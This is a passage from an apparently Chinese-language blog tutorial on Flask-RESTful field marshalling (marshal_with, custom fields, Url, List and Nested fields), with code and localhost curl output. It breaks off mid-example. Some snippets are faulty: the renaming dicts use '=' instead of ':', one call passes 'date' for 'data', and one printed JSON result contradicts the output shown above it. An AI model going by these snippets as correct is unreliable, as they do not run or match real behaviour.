title="6.格式化字段"></a>6.格式化字段</h3><blockquote><p><code>Flask_Restful</code> 提供了一种简单的方法来控制在<code>HTTP Response</code> 中实际呈现的数据.可以简单的返回一个字典类型的数据,也可以使用<code>flask_restful.fields</code> 模块,这个模块允许在资源中使用所需要的任何对象(<code>ORM</code>自定义类等等),它还可以格式化或过滤<code>HTTP Response</code> ,而不必担心暴露内部数据结构.</p><p><code>marshal_with</code>装饰器,会返回一个<code>OrderDict</code>对象</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> fields<span class="token punctuation">,</span> marshal_with<span class="token operator">>></span><span class="token operator">></span> mfields <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'a'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>Raw <span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> @marshal_with<span class="token punctuation">(</span>mfields<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token string">'foo'</span> <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> get<span class="token punctuation">(</span><span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="1-基本用法"><a href="#1-基本用法" class="headerlink" title="1.基本用法"></a>1.基本用法</h4><blockquote><p>可以定义一个<code>fields</code>的<code>OrderedDict</code> 字典,键指向属性名称或要呈现在对象上的键,值是格式化并返回该字段的类.类似如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Resource<span class="token punctuation">,</span>fields<span class="token punctuation">,</span>marshal_with<span class="token punctuation">,</span>Api<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token comment" spellcheck="true"># pytz是一个时区的datetime object</span><span class="token keyword">import</span> pytzapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1.Api绑定app</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Register</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>name <span class="token operator">=</span> name     self<span class="token punctuation">.</span>date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span>tz<span class="token operator">=</span>pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.重载Get/Post方法</span><span class="token keyword">class</span> <span class="token class-name">Todo</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span> resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span>     <span class="token string">'name'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span>     <span class="token string">'date'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>DateTime<span class="token punctuation">(</span>dt_format<span class="token operator">=</span><span class="token string">'rfc822'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> @marshal_with<span class="token punctuation">(</span>resource_fields<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>     <span class="token keyword">return</span> Register<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">200</span>  <span class="token comment" spellcheck="true"># 可以返回状态码</span><span class="token comment" spellcheck="true"># 3.注册路由/资源</span>api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>Todo<span class="token punctuation">,</span><span class="token string">'/api/todo/&lt;name>/'</span><span class="token punctuation">,</span>endpoint<span class="token operator">=</span><span class="token string">'todo'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问并得到:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ curl http://127.0.0.1:5000/api/todo/Jack/{ "name": "Jack", "date": "Wed, 11 Dec 2015 15:07:36 -0000"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@marshel_with</code> 是一个装饰器,能真正接受对象,并过滤字段.</p></blockquote><h4 id="2-重命名属性"><a href="#2-重命名属性" class="headerlink" title="2.重命名属性"></a>2.重命名属性</h4><blockquote><p>出于隐藏后台数据,保证安全的角度考虑,可以使用<code>attribute</code> 配置面向公众的字段.比如</p><pre class="line-numbers language-python"><code class="language-python">resource_fields<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">'name'</span> <span class="token operator">=</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'true_name'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 任何可调用的函数,比如 lambda 也可以指定 attribute</span>resource_fields<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">'name'</span> <span class="token operator">=</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">.</span>true_name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 也可以指定嵌套属性</span>resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'people_list.0.person_dictionary.name'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'address'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-默认值"><a href="#3-默认值" class="headerlink" title="3.默认值"></a>3.默认值</h4><blockquote><p>可以指定默认值,这样就不会返回<code>None</code></p><pre class="line-numbers language-python"><code class="language-python">resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'name'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">(</span>default<span class="token operator">=</span><span class="token string">'any'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-自定义字段和值"><a href="#4-自定义字段和值" class="headerlink" title="4.自定义字段和值"></a>4.自定义字段和值</h4><blockquote><p>如果需要自定义格式,可以继承自<code>fields.Raw</code> 类并重载<code>format</code> 方法.比如:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">UrgentItem</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span>Raw<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">format</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token string">"Urgent"</span> <span class="token keyword">if</span> value <span class="token operator">&amp;</span> <span class="token number">0x01</span> <span class="token keyword">else</span> <span class="token string">"Normal"</span><span class="token keyword">class</span> <span class="token class-name">UnreadItem</span><span class="token punctuation">(</span>fields<span class="token punctuation">.</span>Raw<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">format</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> <span class="token string">"Unread"</span> <span class="token keyword">if</span> value <span class="token operator">&amp;</span> <span class="token number">0x02</span> <span class="token keyword">else</span> <span class="token string">"Read"</span>resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span> <span class="token string">'priority'</span><span class="token punctuation">:</span> UrgentItem<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'flags'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'status'</span><span class="token punctuation">:</span> UnreadItem<span class="token punctuation">(</span>attribute<span class="token operator">=</span><span class="token string">'flags'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-fields-Url"><a href="#5-fields-Url" class="headerlink" title="5.fields.Url"></a>5.<code>fields.Url</code></h4><blockquote><p><code>fields.Url</code>:为请求的资源综合一个<code>URL</code> .类似如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> Resource<span class="token punctuation">,</span>fields<span class="token punctuation">,</span>marshal_with<span class="token punctuation">,</span>Api<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token comment" spellcheck="true"># pytz是一个时区的datetime object</span><span class="token keyword">import</span> pytzapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1.Api绑定app</span>api <span class="token operator">=</span> Api<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Register</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>     self<span class="token punctuation">.</span>name <span class="token operator">=</span> name     self<span class="token punctuation">.</span>date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span>tz<span class="token operator">=</span>pytz<span class="token punctuation">.</span>timezone<span class="token punctuation">(</span><span class="token string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.重载Get/Post方法</span><span class="token keyword">class</span> <span class="token class-name">Todo</span><span class="token punctuation">(</span>Resource<span class="token punctuation">)</span><span class="token punctuation">:</span> resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span>     <span class="token string">'name'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span>     <span class="token string">'date'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>DateTime<span class="token punctuation">(</span>dt_format<span class="token operator">=</span><span class="token string">'rfc822'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># 返回一个url 相对路径</span>     <span class="token string">'uri'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>Url<span class="token punctuation">(</span><span class="token string">'todo'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># 返回一个url 绝对路径</span>     <span class="token string">'uri_absolute'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>Url<span class="token punctuation">(</span><span class="token string">'todo'</span><span class="token punctuation">,</span>absolute<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token comment" spellcheck="true"># 返回一个url http绝对路径</span>     <span class="token string">'https_uri'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>Url<span class="token punctuation">(</span><span class="token string">'todo'</span><span class="token punctuation">,</span>absolute<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>scheme<span class="token operator">=</span><span class="token string">'https'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> @marshal_with<span class="token punctuation">(</span>resource_fields<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>     <span class="token keyword">return</span> Register<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.注册路由/资源</span>api<span class="token punctuation">.</span>add_resource<span class="token punctuation">(</span>Todo<span class="token punctuation">,</span><span class="token string">'/api/todo/&lt;name>/'</span><span class="token punctuation">,</span>endpoint<span class="token operator">=</span><span class="token string">'todo'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问:</p><pre class="line-numbers language-shell"><code class="language-shell">❯ curl http://127.0.0.1:5000/api/todo/Jack/{ "name": "Jack", "date": "Thu, 12 Dec 2019 11:14:05 -0000", "uri": "/api/todo/Jack/", "uri_absolute": "http://127.0.0.1:5000/api/todo/Jack/", "https_uri": "https://127.0.0.1:5000/api/todo/Jack/"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-复杂结构"><a href="#6-复杂结构" class="headerlink" title="6.复杂结构"></a>6.复杂结构</h4><blockquote><p>引入2个方法:</p><ul><li><code>flask_restful.marshal(data,fields,envelope=None)</code>:把<code>dict\list</code> 数据类型转换为<code>OrderedDict</code> 数据类型,用于过滤数据.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># data:实际的对象</span><span class="token comment" spellcheck="true"># fields: 需要过滤的数据类型</span><span class="token comment" spellcheck="true"># envelope: 类似别名</span><span class="token comment" spellcheck="true"># 原始数据,需要过滤的数据</span><span class="token operator">>></span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'foo'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 过滤条件</span><span class="token operator">>></span><span class="token operator">></span> mfields <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>Raw<span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 过滤</span><span class="token operator">>></span><span class="token operator">></span> marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>mfields<span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 过滤后的数据,可以打包成 json数据</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> json<span class="token operator">>></span><span class="token operator">></span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>mfields<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'{"a": 100}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>flask_restful.marshal_with(fields, envelope=None)</code> :一个装饰器,可以支持自定义函数,返回的效果和上一个相同.</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> flask_restful <span class="token keyword">import</span> marshal_with<span class="token operator">>></span><span class="token operator">></span> mfields <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> @marshal_with<span class="token punctuation">(</span>mfields<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'foo'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token operator">>></span><span class="token operator">></span> <span class="token operator">>></span><span class="token operator">></span> get<span class="token punctuation">(</span><span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'{"a": "foo"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>处理一个复杂的结构:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 过滤器,过滤条件,输出格式.</span><span class="token operator">>></span><span class="token operator">></span> resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'name'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'line1'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'line2'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'line3'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>Raw<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 原始数据</span><span class="token operator">>></span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'Jack'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'line1'</span><span class="token punctuation">:</span><span class="token string">'This is a test'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'line2'</span><span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'line3'</span><span class="token punctuation">:</span><span class="token string">'hello'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 组装成 OrderDict对象</span><span class="token operator">>></span><span class="token operator">></span> marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'address'</span><span class="token punctuation">,</span> OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'line1'</span><span class="token punctuation">,</span> <span class="token string">'This is a test'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'line2'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'line3'</span><span class="token punctuation">,</span> <span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 生成Json数据</span><span class="token operator">>></span><span class="token operator">></span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>marshal<span class="token punctuation">(</span>date<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'{"name": "jack", "address": {"line1": null, "line2": 0, "line3": null}}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>也可以对列表进行处理:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 需要处理的数据</span><span class="token operator">>></span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'book'</span><span class="token punctuation">:</span><span class="token string">'Python'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'detail'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">,</span><span class="token string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 过滤器</span><span class="token operator">>></span><span class="token operator">></span> resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'detail'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>List<span class="token punctuation">(</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 转化</span><span class="token operator">>></span><span class="token operator">></span> marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'detail'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">,</span> <span class="token string">'description'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Json数据</span><span class="token operator">>></span><span class="token operator">></span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">'{"name": null, "detail": ["price", "description"]}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>fiels.List()</code> 只能过滤一种数据类型</li></ul><hr><p>处理嵌套数据<code>fields.Nested</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'book'</span><span class="token punctuation">:</span><span class="token string">'Python'</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'detail'</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'price'</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'description'</span><span class="token punctuation">:</span><span class="token string">'This is a Python book.'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token operator">>></span><span class="token operator">></span> resource_fields <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'name'</span><span class="token punctuation">:</span> fields<span class="token punctuation">.</span>String<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token string">'detail'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>List<span class="token punctuation">(</span>fields<span class="token punctuation">.</span>Nested<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'price'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token string">'description'</span><span class="token punctuation">:</span>fields<span class="token punctuation">.</span>String<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token operator">>></span><span class="token operator">></span> marshal<span class="token punctuation">(</span>data<span class="token punctuation">,</span>resource_fields<span class="token punctuation">)</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'detail'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>OrderedDict<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'price'</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'description'</span><span class="token punctuation">,</span> <span class="token string">'This is a Python book.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token 